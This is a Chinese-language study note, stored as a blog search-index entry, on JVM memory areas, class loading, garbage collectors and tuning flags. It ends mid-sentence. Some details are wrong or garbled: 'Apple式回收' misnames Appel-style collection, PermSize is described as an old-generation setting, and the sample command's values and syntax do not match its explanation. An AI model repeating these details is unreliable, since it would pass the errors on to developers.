[{"title":"JVM底层原理","url":"/2023/05/03/JVM%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/","content":"JVM的组成及其作用JVM 主要由以下四部分组成：运行时数据区（Runtime Data Area）、类加载器（ClassLoader）、执行引擎（Execution Engine ）和本地方法接口（Native Method Interface）。\n\nJVM 是执行 Java 程序的虚拟计算机系统，执行过程是：首先需要准备好编译好的 Java 字节码文件（即class文件），计算机要运行程序需要先通过一定方式（类加载器）将 class 文件加载到内存中（运行时数据区），但是字节码文件是JVM定义的一套指令集规范，并不能直接交给底层操作系统去执行，因此需要特定的命令解释器（执行引擎）将字节码翻译成特定的操作系统指令集交给 CPU 去执行，这个过程中会需要调用到一些不同语言为 Java 提供的接口（例如驱动、地图制作等），这就用到了本地 Native 接口（本地库接口）。\n运行时数据区（内存模型）运行时数据区，即 JVM 内存，由多个不同的数据区域组成，包括程序计数器、虚拟机栈、本地方法栈、堆和方法区（JDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了，取而代之是元空间）。\n其中，程序计数器、虚拟机栈和本地方法栈是线程隔离的数据区，堆和元空间（方法区）是由所有线程共享的数据区。\n\n\n程序计数器（Program Counter Register）是当前线程所执行的字节码的行号指示器。\n\n虚拟机栈（Java Virtual Machine Stack）描述的是Java方法执行的线程内存模型：每个方法被执行的时候，Java虚拟机都 会同步创建一个栈帧（Stack Frame）用于存储局部变量表、操作数栈、动态连接、方法出口等信息。\n局部变量表存放了编译期的Java虚拟机基本数据类型、对象引用和returnAddress类型的数据，存储单位是局部变量槽（Slot），其中64位长度的long和double类型的数据会占用两个变量槽，其余的数据类型只占用一个。\n操作数栈 主要作为方法调用的中转站使用，用于存放方法执行过程中产生的中间计算结果。另外，计算过程中产生的临时变量也会放在操作数栈中。\n动态链接 主要服务一个方法需要调用其他方法的场景。Class 文件的常量池里保存有大量的符号引用比如方法引用的符号引用。当一个方法要调用其他方法，需要将常量池中指向方法的符号引用转化为其在内存地址中的直接引用。动态链接的作用就是为了将符号引用转换为调用方法的直接引用，这个过程也被称为 动态连接 。\n每一个方法被调用直至执行完毕的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。\n\n本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别只是虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而本地方法栈则是为虚拟机使用到的本地（Native） 方法服务。\n\n堆（Java Heap）这块内存区域的唯一用途就是存放对象实例，堆是垃圾收集器管理的内存区域，所以又称“GC堆”。\n\n元空间（JDK1.7及以前是方法区）用于存储已被虚拟机加载的类型信息、常量、静态变量、即时编译器编译后的代码缓存等数据。\n运行时常量池（Runtime Constant Pool）是元空间的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池表（Constant Pool Table），用于存放编译期生成的各种字面量与符号引用，这部分内容将在类加载后存放到方法区的运行时常量池中。\n\n直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分\n在JDK 1.4中新加入了NIO（New Input&#x2F;Output）类，引入了一种基于通道（Channel）与缓冲区 （Buffer）的I&#x2F;O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的 DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。\n\n\n类加载器类加载器负责将类文件（.class 文件）加载到 JVM 中，并生成对应的 Class 对象。\n执行引擎执行引擎负责执行字节码指令，包括解释器和即时编译器两种执行方式。\n此外还包含垃圾回收器，用于内存管理，可以自动释放不再使用的内存空间。\n本地方法接口允许 Java 程序与底层的本地系统交互，例如调用 C&#x2F;C++ 等语言编写的库。\n类加载机制类加载器功能类加载器的主要（其实除了加载类之外，类加载器还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源）作用就是加载 Java 类的字节码（ .class 文件）到 JVM 中（在内存中生成一个代表该类的 Class 对象）。\n数组类不是通过 ClassLoader 创建的（数组类没有对应的二进制字节流），是由 JVM 直接生成的。\n加载规则JVM 启动的时候，并不会一次性加载所有的类，而是根据需要去动态加载。也就是说，大部分类在具体用到的时候才会去加载，这样对内存更加友好。\n对于已经加载的类会被放在 ClassLoader 中。在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。也就是说，对于一个类加载器来说，相同二进制名称的类只会被加载一次。\n类型JVM类加载器（Class Loader）负责将.class文件加载到内存，主要有四种：\n\n引导类加载器（Bootstrap ClassLoader）：负责加载Java核心类库（位于%Java_HOME%&#x2F;lib下），如java.util等，以及被 -Xbootclasspath参数指定的路径下的类。\n\n扩展类加载器（Extension ClassLoader）：负责加载Java扩展库（位于%Java_HOME%&#x2F;jre&#x2F;lib&#x2F;ext下），以及通过java.ext.dirs系统变量指定的路径下的类。\n\n应用类加载器（Application ClassLoader）：负责加载用户程序的类路径（classpath）下的类。如果程序没有自定义类加载器, 就默认使用应用程序类加载器。\n\n自定义类加载器（User ClassLoader）：主要负责加载用户自定义的类，**不允许加载java.开头的类的**。\n自定义类加载器是通过继承java.lang.ClassLoader类并重写loadClass（实现了双亲委派机制）和findClass方法实现的。如果我们不想打破双亲委派模型，就重写 ClassLoader 类中的 findClass() 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 loadClass() 方法。\n\n\n双亲委派模型类加载器采用双亲委派模型（Parent-Delegation Model）。当加载类时，先请求父加载器加载；父加载器无法加载时，当前加载器尝试加载。这保证了Java核心类库安全与一致性，避免应用程序覆盖核心类库。\n\n补充：\n每个 Java 类都有一个引用指向加载它的 ClassLoader。\nJVM 判定两个 Java 类是否相同的具体规则：JVM 不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样。只有两者都相同的情况，才认为两个类是相同的。即使两个类来源于同一个 Class 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相同。\n\n双亲委派模型的好处\n双亲委派模型保证了 Java 程序的稳定运行，可以避免类的重复加载（JVM 区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类），也保证了 Java 的核心 API 不被篡改。\n如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个称为 java.lang.Object 类的话，那么程序运行的时候，系统就会出现两个不同的 Object 类。双亲委派模型可以保证加载的是 JRE 里的那个 Object 类，而不是你写的 Object 类。这是因为 AppClassLoader 在加载你的 Object 类时，会委托给 ExtClassLoader 去加载，而 ExtClassLoader 又会委托给 BootstrapClassLoader，BootstrapClassLoader 发现自己已经加载过了 Object 类，会直接返回，不会去加载你写的 Object 类。\n打破了双亲委派模型的应用例子\n\nTomcat下Web 应用之间的类隔离\nTomcat 服务器会给每个 Web 应用创建一个类加载器实例（WebAppClassLoader实例）。WebAppClassLoader是Tomcat 自定义的类加载器，打破了双亲委托机制，每个 WebappClassLoader 加载自己目录下的.class文件，不会传递给父加载器，从而实现Web应用层级的隔离。\n\n\n父子类加载和初始化顺序关系在JVM类加载阶段，父子类关系表现在加载和初始化过程。加载子类时，所有父类被加载。初始化时，父类先于子类初始化，确保子类使用父类静态字段和方法时，父类已初始化。\n类加载阶段Java虚拟机（JVM）的类加载机制是Java程序运行时将.class文件加载到内存的过程。类加载主要分为五个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）和初始化（Initialization）。和后续两个阶段，使用（Using）、卸载（Unloading），共同组成了类的生命周期。\n\n加载、验证、准备、初始化和卸载这五个阶段的顺序是确定的，类型的加载过程必须按 照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始， 这是为了支持Java语言的运行时绑定特性（也称为动态绑定或晚期绑定）。\n\n加载（Loading）：在这个阶段，类加载器通过全类名获取查找并加载指定的.class文件二进制字节流，在内存中创建一个Class对象来表示这个类。加载阶段与连接阶段的部分动作(如一部分字节码文件格式验证动作)是交叉进行的，加载阶段尚未结束，连接阶段可能就已经开始了。\n\n连接（Linking）：验证、准备和解析这三个阶段可以统称为连接\n\n验证（Verification）:这一阶段会进行文件格式验证、元数据验证和字节码验证等 ，目的是确保 Class 文件的字节流中包含的信息符合《Java 虚拟机规范》的全部约束要求，保证这些信息被当作代码运行后不会危害虚拟机自身的安全。\n\n准备（Preparation）: 在这个阶段会为类的静态变量分配内存，并赋予默认值。\n 对于final类型的静态变量，如果它们在编译时可以确定值（即编译时常量），在准备阶段直接为它们分配内存并赋予程序员在代码中指定的初始值。这是因为final变量的值在程序运行期间是不可变的，所以可以提前赋值。然而，如果一个final类型的静态变量不能在编译时确定值（例如，它的值是通过方法调用得到的），那么这个变量在准备阶段仍然会被赋予默认值，然后在初始化阶段由程序员指定的值替换。\n 对于非final类型的静态变量，在准备阶段赋予的默认值就不是程序员在代码中指定的初始值，而是基本类型的零值或引用类型的null值。\n\n\n\n解析（Resolution）: 解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。 解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用限定符 7 类符号引用进行。这个过程可能会触发其他类的加载。这个过程可能会触发其他类的加载。需要注意的是，并非所有的符号引用都会在解析阶段被替换为直接引用，有些符号引用会在程序运行时进行动态解析。这通常发生在反射和动态代理等场景下。\n\n\n初始化（Initialization）：在这个阶段，JVM会根据程序员在代码中指定的初始值，为类的静态变量赋予正确的值。此外，如果类有静态代码块，JVM会执行这些代码块。初始化阶段是类加载过程中的最后一个阶段。\n\n\n检验阶段类加载过程中主要包括四个检验阶段：\n\n文件格式验证（Class 文件格式检查）：发生在类加载过程中的验证阶段\n元数据验证（字节码语义检查）：发生在类加载过程中的验证阶段\n字节码验证（程序语义检查）：发生在类加载过程中的验证阶段\n符号引用验证（类的正确性检查）：发生在类加载过程中的解析阶段\n\n文件格式验证\n文件格式验证这一阶段是基于该类的二进制字节流进行的，主要目的是保证输入的字节流能正确地解析并存储于方法区之内，格式上符合描述一个 Java 类型信息的要求。除了这一阶段之外，其余三个验证阶段都是基于方法区的存储结构上进行的，不会再直接读取、操作字节流了。\n\n方法区属于是 JVM 运行时数据区域的一块逻辑区域，是各个线程共享的内存区域。当虚拟机要使用一个类时，它需要读取并解析 Class 文件获取相关信息，再将信息存入到方法区。方法区会存储已被虚拟机加载的 类信息、字段信息、方法信息、常量、静态变量、即时编译器编译后的代码缓存等数据。\n关于方法区的详细介绍，推荐阅读 Java 内存区域详解open in new window 这篇文章。\n\n符号引用验证\n符号引用验证的主要目的是确保解析阶段能正常执行，如果无法通过符号引用验证，JVM 会抛出异常，比如：\n\njava.lang.IllegalAccessError：当类试图访问或修改它没有权限访问的字段，或调用它没有权限访问的方法时，抛出该异常。\njava.lang.NoSuchFieldError：当类试图访问或修改一个指定的对象字段，而该对象不再包含该字段时，抛出该异常。\njava.lang.NoSuchMethodError：当类试图访问一个指定的方法，而该方法不存在时，抛出该异常。\n……\n\n符号引用和直接引用\n在Java程序中，类、接口、字段和方法等元素在源代码中的表示形式通常是符号引用（Symbolic Reference）。符号引用是一种依赖于符号（如类名、方法名和字段名等）的引用形式。然而，为了在运行时更高效地访问这些元素，JVM需要将这些符号引用替换为直接引用（Direct Reference）。\n直接引用是一种可以直接指向内存地址或者间接指向内存地址的引用。在JVM中，直接引用可以是指向方法区（Method Area）中类和接口数据结构的指针、指向实例变量和类变量的内存地址的偏移量，或者是指向常量池中某个常量的索引。\n符号引用和直接引用的区别在于，符号引用需要在运行时通过查找和解析得到实际的内存地址，而直接引用已经包含了实际的内存地址信息，可以直接访问目标元素。因此，使用直接引用可以提高程序运行时的访问速度。\nOSGIOSGI（Open Service Gateway Initiative）是一个用于实现模块化和动态组件系统的开放标准框架。它允许在一个Java虚拟机（JVM）实例中创建和管理多个模块化组件，这些组件被称为“bundles”。OSGI提供了一种将Java应用程序分解为更小、更易于管理和维护的模块的方法，从而提高了开发人员的生产力和代码的可重用性。\nOSGI的主要特点如下：\n\n模块化：OSGI框架支持将Java应用程序划分为多个模块，每个模块都可以独立开发、部署和更新，从而降低了开发复杂性和维护成本。\n\n动态：OSGI支持动态加载、卸载和更新模块，这意味着在不重启整个应用程序的情况下，可以热部署模块，提高了系统的灵活性和可扩展性。\n\n服务注册和发现：OSGI提供了一个服务注册表，允许模块之间通过服务接口进行通信，而不是直接依赖于其他模块的具体实现。这有助于降低模块间的耦合度，提高代码的可维护性和可重用性。\n\n版本管理：OSGI允许同一个JVM中存在不同版本的模块，这样可以在升级或修复某个模块时避免对其他模块产生影响。\n\n\nOSGI已被广泛应用于各种Java项目中，例如Eclipse IDE（集成开发环境）就是基于OSGI构建的\nOSGI不遵循双亲委派模型，在安全上有所牺牲\n垃圾回收理论对象是否存活的判断算法\n引用计数算法\n给对象中添加一个引用计数器：\n\n每当有一个地方引用它，计数器就加 1；\n当引用失效，计数器就减 1；\n任何时候计数器为 0 的对象就是不可能再被使用的。\n\n这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间循环引用的问题。\n\n可达性分析算法\n这个算法的基本思想就是通过一系列的称为 “GC Roots” 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的，需要被回收。\n\n\n无论是通过引用计数法判断对象引用数量，还是通过可达性分析法判断对象的引用链是否可达，判定对象的存活都与“引用”有关。\nJava引用类型和垃圾回收的关系在Java中，引用类型可以分为四种：强引用、软引用、弱引用和虚引用。它们主要在对象的生命周期和垃圾回收方面有所区别。\n\n强引用（Strong Reference）：当一个对象被强引用指向时，它不会被垃圾回收器回收。只有当强引用不再指向该对象时，该对象才有可能被回收。\n\nObject obj = new Object();\n\n\n软引用（Soft Reference）：当一个对象只被软引用指向时，它在内存不足时会被垃圾回收器回收。软引用主要用于实现缓存功能。\n\nimport java.lang.ref.SoftReference;Object obj = new Object(); // obj 是一个强引用SoftReference&lt;Object&gt; softReference = new SoftReference&lt;&gt;(obj); // softReference 是一个软引用\n\n\n弱引用（Weak Reference）：当一个对象只被弱引用指向时，可以被垃圾回收器回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构，如ThreadLocal的实现就使用了弱引用。若是强引用，即使tl&#x3D;null ，但key的引用依然指向ThreadLocal对象，所以会有内存泄漏，而使用弱引用则不会。具体来说，ThreadLocal由一个名为ThreadLocal.ThreadLocalMap的内部类来保存。在ThreadLocalMap中，set到ThreadLocal对象的值作为值（value），ThreadLocal对象作为键（key），并且key是一个弱引用。这意味着，如果ThreadLocal对象没有其他强引用存在，那么这个ThreadLocal对象就可能在下一次垃圾回收时被回收。但还是有内存泄漏存在，ThreadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏，所以还是需要remve()这个key。\n\nimport java.lang.ref.WeakReference;Object obj = new Object();WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj);\n\n\n虚引用（Phantom Reference）：虚引用主要用来跟踪对象被垃圾回收的活动。当一个对象只被虚引用指向时，可以被垃圾回收器回收。\n虚引用与软引用和弱引用的一个区别在于： 虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。\n虚引用的一个用途是管理堆外内存，当DirectByteBuffer对象被回收时，就向ReferenceQueue对象中添加数据，垃圾回收器可以通过检测ReferenceQueue对象得到到这一变化，然后清理堆外内存。\n\n\nimport java.lang.ref.PhantomReference;import java.lang.ref.ReferenceQueue;Object obj = new Object();ReferenceQueue&lt;Object&gt; referenceQueue = new ReferenceQueue&lt;&gt;();PhantomReference&lt;Object&gt; phantomReference = new PhantomReference&lt;&gt;(obj, referenceQueue);\n\n分代回收理论分代收集理论建立在两个假说之上，分别是弱分代假说和强分代假说：\n\n弱分代假说：绝大多数对象的生命周期都很短，绝大多数的对象都是朝生夕灭的。 \n强分代假说：熬过越多次垃圾收集过程的对象越难以消亡。\n\n根据对象的生命周期将内存分为新生代和老年代两个部分。优先回收新生代中的对象，减少全局垃圾回收的次数，提高效率。  回收效率高，不容易产生内存碎片。缺点是需要对内存进行分代管理，增加了复杂性。\nApple式回收Apple式回收（基于分代收集理论和标记复制算法）：把新生代分为一块较大的Eden空间和两块较小的Survivor空间，每次分配内存只使用Eden和一块Survivor。发生垃圾收集时，将Eden和Survivor中仍然存活的对象一次性复制到另外一块Survivor空间上。然后直接清理掉Eden和已经使用过的那块Survivor。当存储存活对象的Survivor不足以容纳所有的存活对象，Apple式回收就使用其他内存区域（大多是老年代）进行分配担保。\n垃圾回收类型\n部分收集\n新生代收集（Minor GC）\n老年代收集（Major GC）\n\n\n整堆收集（Full GC）\n\n垃圾回收算法判断对象是否“存活”的方法有引用计数算法和可达性分析法。\n\n\n\n名称\n时间\n基本原理\n优点\n缺点\n适用场景\n适用代\n\n\n\n标记-清除算法\n20世纪50年代\n标记所有活动对象，然后清除所有未标记的对象。 也可以反过来。 是最基础的垃圾收集算法，后续的回收算法大都是以标记-清除算法为基础，对其缺点进行改进得到的。\n简单易懂，可处理循环引用的情况。\n容易产生内存碎片。\n由于不需要内存移动，所以在内存回收时延迟低，关注延迟的CMS收集器就是基于标记-清除算法实现的，当CMS收集器面临空间碎片过多时，会采用标记-整理算法清除一次。\n适合用于老年代的回收\n\n\n标记-整理算法\n20世纪60年代\n其标记过程仍然和标记-清除算法一样，但后续步骤不是直接对可回收对象进行清除，而是将所有存活对象向内存空间的一端移动，然后直接清理掉边界外的内存。\n不容易产生内存碎片。\n需要移动对象，可能会造成较长的停顿时间。\n由于是否移动内存是优缺点并存的，移动则内存回收时会增加耗时，不移动则内存分配时会增加耗时。之所以不移动内存会增加耗时，是因为即使垃圾收集器的效率提高一些，也会因为内存分配和访问比垃圾收集频率要高得多，导致这部分耗时增加，总的吞吐量仍然会下降。所以，关注吞吐量的Parallel Old是基于标记-整理算法的。\n适合用于老年代的回收\n\n\n标记-复制算法\n20世纪60年代\n将内存分成已使用（From）和空闲（To）区域。在垃圾回收时，将存活的对象从 From 区域复制到 To 区域，然后清空 From 区域。现在的商业虚拟机都采用这种收集算法来回收新生代。\n不容易产生内存碎片。\n浪费一半内存空间。如果多数对象都是存活的，就会产生大量内存间的复制开销。\n由于，如果多数对象都是可回收的，需要复制的只是占少数的存活对象。所以适合新生代。现在的商用虚拟机大多优先采用这种算法回收新生代。\n适合用于新生代的回收\n\n\n在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。\n垃圾回收器Java 的垃圾回收器有多种实现方式，每种垃圾回收器都有其独特的特点和适用场景。\n垃圾收集器下的并行和并发\n并行：描述的是多条垃圾收集器线程之间的关系。\n并发：描述的是垃圾收集器和用户线程之间的关系。\n\n默认垃圾收集器JDK 默认使用的垃圾收集器（使用 java -XX:+PrintCommandLineFlags -version 命令查看）：\n\nJDK 8：Parallel Scavenge（新生代）+ Parallel Old（老年代）\nJDK 9 ~ JDK20: G1\n\n\n经典垃圾回收器这里讨论的经典垃圾收集器是JDK7 Update4之后，JDK11正式发布之前，OracleJDK和HotSpot虚拟机所包含的全部可用的垃圾收集器。\n新生代垃圾回收器所有的新生代的垃圾回收器都是标记-复制算法.\n\n\n\n收集器\n收集对象和算法\n收集器类型\n描述\n\n\n\nSerial\n新生代，标记-复制算法\n单线程\n单线程强调的是它在垃圾收集时，必须暂停其他所有工作线程，直到收集完成。是HotSpot虚拟机运行在客户端模式下默认新生代收集器。适合处理器核心较少的环境。\n\n\nParNew\n新生代，标记-复制算法\n并行\n实际上是Serial的多线程版本，除了同时使用多条线程进行垃圾收集外，其余都和Serial一样。默认开启和处理器核心数量相同的线程数，在目前服务器CPU往往达到32核核环境下，可以适用-XX:ParallelGCThreads参数来限制。\n\n\nParallel Scavenge\n新生代，标记-复制算法\n并行\nParallel Scavenge的特点是它的关注点和其它收集器不同，Parallel Scavenge关注点是吞吐量，所谓吞吐量就是处理器用于运行用户代码的时间和处理器总消耗时间的比值。其合适的搭配是Parallel Old。只有ParNew能和CMS配合使用。有自适应的调节策略\n\n\n老年代垃圾收集器老年代使用到两种算法，标记整理算法 和 标记清除算法。\n\n\n\n收集器\n收集对象和算法\n收集器类型\n描述\n\n\n\nSerial Old\n老年代，标记整理算法\n单线程\n是Serial的老年代版本。它主要有两大用途：一种用途是在 JDK1.5 以及以前的版本中与 Parallel Scavenge 收集器搭配使用，另一种用途是作为 CMS 收集器的后备方案。\n\n\nCMS\n老年代，标记清除算法\n并行与并发\nCMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。是 HotSpot 虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。运作过程相对复杂，整个过程分为四步：初始标记、并发标记、重新标记、并发清除。\n\n\nParallel Old\n老年代，标记整理算法\n并行\n是Parallel Scavenge的老年代版本，注重吞吐量。\n\n\nCMS的回收步骤：\n初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；\n并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。\n重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短。\n并发清除： 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。\n\nCMS的缺点：\n从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：并发收集、低停顿。但是它有下面三个明显的缺点：\n\n对 CPU 资源敏感；\n无法处理浮动垃圾；\n它使用的回收算法“标记-清除”算法会导致收集结束时会有大量空间碎片产生。\n\n全功能垃圾收集器\n\n\n收集器\n收集对象和算法\n收集器类型\n优点\n缺点\n描述\n\n\n\nG1\n跨新生代和老年代；化整为零\n并行与并发收集器\n回收的最小单元不再是固定大小的新生代和老年代，而是Region，进而采用具有优先级的区域回收方式，保证了G1收集器在有限的时间内获取尽可能高的收集效率。\n\nG1（ Garbage-First ）开创了面向局部收集的设计思路和基于Region的内存布局形式，不再以固定大小及固定数量的分代区域划分，而是把连续的Java堆划分为多个大小相等的独立区域（Region），每一杠Region根据需要，扮演新生代的Eden空间、Survior区间，或者老年代空间。并对不同角色的Region采用不同的策略去处理。Region中还有一类特殊的区域，Humongous，用来存储大对象。G1在大内存应用上表现好，CMS在小内存应用上表现优于G1。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器。\n\n\nG1 收集器的运作大致分为以下几个步骤：\n\n初始标记\n并发标记\n最终标记\n筛选回收\n\n\nG1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来) 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。\n低延迟垃圾回收器Shenandoah（ˌʃɛnənˈdoʊə）和ZGC两款垃圾收集器在几乎整个工作时间里都是并发的，而CMS和G1在回收新生代的垃圾时必须挂起用户线程。并且Shenandoah和ZGC这两款垃圾收集器可以在任意可管理的堆容量下实现垃圾收集的停顿不超过十毫秒。\nShenandoah垃圾回收器是一款只有OpenJDK才会包含，而OracleJDK里不存在的收集器，Shenandoah和G1有着相似的堆内存布局，是基于G1开发的，并对G1的一些不足进行了改进。\nZGC是一款基于Region内存布局的，使用了读屏障、染色体指针和内存多重映射等技术来实现可并发的标记-整理算法，以低延迟为首要目标的垃圾收集器。\nJava11 的时候 ，ZGC 还在试验阶段。经过多个版本的迭代，不断的完善和修复问题，ZGC 在 Java 15 已经可以正式使用了！不过，默认的垃圾回收器依然是 G1。\n不进行垃圾回收的垃圾收集器Epsilon 垃圾回收器是一款以不进行垃圾回收的垃圾回收器，只复责分配和释放内存空间、与解释器协作、与编译器协作等简单的内存管理任务。\n在实际生产环境中是有用武之地的，比如以下两种情景：\n\n如果应用只需要运行数分钟或数秒，只要Java虚拟机能正确的分配内存，在堆耗尽之前就会退出，那显然没有任何回收行为的Epsilon就很合适。\n需要剥离垃圾回收器影响的性能测试和压力测试\n\nJVM的参数配置堆内存相关的参数（部分）\n\n\n参数名\n描述\n使用示例\n\n\n\n-Xms\n设置JVM堆内存的最小大小\n-Xms512m 将堆内存的最小大小设置为512MB\n\n\n-Xmx\n设置JVM堆内存的最大大小\n-Xmx2g 将堆内存的最大大小设置为2GB\n\n\n-XX:MetaspaceSize\n设置JVM元空间的最小大小。无论 -XX:MetaspaceSize 配置什么值，对于 64 位 JVM 来说，Metaspace 的初始容量都是 21807104（约 20.8m）。\n-XX:MetaspaceSize=256m 将元空间的最小大小设置为256MB。\n\n\n-XX:MaxMetaspaceSize\n设置JVM元空间的最大大小\n-XX:MaxMetaspaceSize=1g将元空间的最大大小设置为1GB\n\n\n-XX:MaxDirectMemorySize\n设置JVM可以使用的最大直接内存大小，其默认值等于JVM的最大堆大小（即-Xmx的值）\n-XX:MaxDirectMemorySize=1g设置JVM的最大直接内存大小为1GB\n\n\n-XX:NewSize\n设置JVM新生代的最小内存大小\n-XX:NewSize=256m将新生代的最小内存大小设置为256MB\n\n\n-XX:MaxNewSize\n设置JVM新生代的最大内存大小\n-XX:MaxNewSize=1024m将新生代的最大内存大小设置为1024MB\n\n\n-Xmn\n设置JVM中新生代的内存大小，默认值是整个堆空间的1&#x2F;4，即-Xmx的1&#x2F;4。当新生代的大小达到了 -Xmn 指定的大小后，如果新生代中仍然有存活的对象，它们将被晋升到老年代。\n-Xmn256m MyApp 将新生代的内存大小设置为256MB，这个参数则是对 -XX:newSize、-XX:MaxnewSize两个参数的同时配置，也就是说如果通过-Xmn来配置新生代的内存大小，那么-XX:newSize &#x3D; -XX:MaxnewSize　&#x3D;　-Xmn\n\n\n-XX:NewRatio\n设置JVM新生代和老年代的内存大小比例\n-XX:NewRatio=2 将新生代和老年代的比例设置为1:2，即新生代占整个堆的1&#x2F;3大小\n\n\n-XX:PermSize\n设置JVM老年代的最小内存大小\n-XX:PermSize=128m 将老年代的最小内存大小设置为128MB\n\n\n-XX:MaxPermSize\n设置JVM老年代的最大内存大小\n-XX:MaxPermSize=256m 将老年代的最大内存大小设置为256MB\n\n\n垃圾回收器相关的参数（部分）\n\n\n参数名\n描述\n使用示例\n\n\n\n-XX:+UseG1GC\n启用G1垃圾回收器\n-XX:+UseG1GC 启用G1垃圾回收器\n\n\n-XX:+UseConcMarkSweepGC\n启用CMS垃圾回收器\n-XX:+UseConcMarkSweepGC 启用CMS垃圾回收器\n\n\nGC日志相关的参数（部分）\n\n\n参数名\n描述\n使用示例\n\n\n\n-XX:+PrintGC\n输出GC（垃圾回收）日志\n-XX:+PrintGC\n\n\n-XX:+PrintGCDetails\n输出GC详细信息\n-XX:+PrintGCDetails\n\n\n-XX:+PrintHeapAtGC\n在每次GC后打印堆的详细信息\n-XX:+PrintHeapAtGC\n\n\n-Xloggc\n设置GC日志输出的文件路径\n-Xloggc:/path/to/gc-%t.log\n\n\n-XX:GCLogFileSize\n设置每个GC文件上限大小，超过就触发分割\n-XX:GCLogFileSize=50M设置GC文件的上限大小是50MB\n\n\nOOM相关的参数（部分）\n\n\n参数名\n描述\n使用示例\n\n\n\n-XX:+HeapDumpOnOutOfMemoryError\n当发生OOM异常时，自动生成堆转储文件（heap dump），以便在之后进行分析\n-XX:+HeapDumpOnOutOfMemoryError当发生OOM异常时打印日志\n\n\n-XX:HeapDumpPath\n指定生成堆转储文件的路径\n-XX:HeapDumpPath=path=dump.log指定OOM日志存储信息\n\n\nJVM参数设置示例8G内存服务器上运行了start.jar和Netty，JVM参数设置示例如下\n其中2GB留给操作系统，其余6GB分配给应用程序\njava -server #JVM运行在服务器模式下-XX:MaxDirectMemorySize=1GB #直接内存大小为1GB（Netty服务在运行时会使用直接内存，需要保证既有足够的直接内存满足Netty服务高效运行，又要在和虚拟机内存大小直接取得平衡）-Xmx3g -Xms3g #Java堆的大小为3GB--XX:NewSize=1GB #新生代占用堆1GB-XX:MaxMetaspaceSize=128m #元空间的大小为128MB-XX:+UseG1GC #启用G1垃圾回收器-XX:+HeapDumpOnOutOfMemoryError #发生OOM时打印日志-XX:HeapDumpPath=path=dump.log #指定OOM日志存储信息-XX:+PrintGCDetails #输出GC详细信息-XX:+PrintHeapAtGC #每次GC后打印堆的详细信息\n\n参数的含义如下：\n\n-server：JVM运行在服务器模式下，以优化长时间运行的性能。\n-Xmx3g：设置JVM的堆内存的最大大小为3GB。\n-Xms3g：设置JVM的堆内存的最小大小为3GB。这个值应该与 -Xmx 相同，以避免堆大小的动态调整。\n-Xmn1g：设置JVM的新生代大小为1GB，这个值可以根据应用程序的内存需求和垃圾收集策略来进行调整。\n-XX:MaxMetaspaceSize=512m：设置JVM的元空间内存的最大大小为512MB。\n-XX:+UseG1GC：使用 G1 垃圾收集器。\n\n这些参数的设置应该根据具体的应用程序和系统配置进行调整，以获得最佳性能和稳定性。另外，可以使用一些诊断工具，如 jstat 和 jmap 等来监测 JVM 的运行状态和内存使用情况，以帮助优化 JVM 的性能和稳定性\nJava监控工具监控命令行工具（部分）这些命令在 JDK （Java Development Kit）安装目录下的 bin 